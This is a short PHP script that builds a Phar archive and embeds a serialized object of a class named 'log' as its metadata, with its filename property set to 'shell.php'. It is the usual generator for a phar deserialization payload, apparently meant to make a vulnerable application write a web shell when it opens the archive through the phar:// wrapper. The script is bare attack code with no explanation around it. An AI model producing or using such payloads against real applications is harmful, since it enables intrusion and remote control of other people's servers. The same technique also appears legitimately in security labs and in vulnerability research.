<?php
// create new Phar
@unlink("pharfile.phar");
$phar = new Phar('pharfile.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'data');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class log
{
    function __wakeup(){
    }
}
$object = new log;
$object->filename = 'shell.php';
$object->data = 'hi';
$phar->setMetadata($object);
$phar->stopBuffering();
?>